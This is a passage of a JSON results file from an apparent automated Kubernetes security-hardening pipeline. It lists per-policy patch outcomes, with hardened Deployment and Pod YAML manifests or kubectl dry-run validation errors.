    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy:stable\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: tls-secret-name-secret\n              key: tls_secret_name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "errors": []
  },
  {
    "id": "00958",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy:stable\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: tls-secret-name-secret\n              key: tls_secret_name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "errors": []
  },
  {
    "id": "00959",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n  selector:\n    matchLabels:\n      app: client\n",
    "errors": []
  },
  {
    "id": "00960",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n  selector:\n    matchLabels:\n      app: client\n",
    "errors": []
  },
  {
    "id": "00961",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n  selector:\n    matchLabels:\n      app: client\n",
    "errors": []
  },
  {
    "id": "00962",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n  selector:\n    matchLabels:\n      app: client\n",
    "errors": []
  },
  {
    "id": "00963",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n  selector:\n    matchLabels:\n      app: client\n",
    "errors": []
  },
  {
    "id": "00964",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"tf-ssdmobilenet-default-1024-2\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00965",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"tf-ssdmobilenet-default-1024-2\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00966",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"tf-ssdmobilenet-default-1024-2\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00967",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"tf-ssdmobilenet-default-1024-2\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00968",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"tf-ssdmobilenet-default-1024-2\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00969",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00970",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00971",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00972",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00973",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00974",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00975",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00976",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00977",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00978",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00979",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00980",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00981",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00982",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00983",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00984",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00985",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00986",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00987",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00988",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00989",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00990",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00991",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00992",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"fdb-bench\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00993",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 100m\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "errors": []
  },
  {
    "id": "00994",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 100m\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "errors": []
  },
  {
    "id": "00995",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 100m\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "errors": []
  },
  {
    "id": "00996",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 100m\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "errors": []
  },
  {
    "id": "00997",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00998",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00999",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01000",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01001",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01002",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
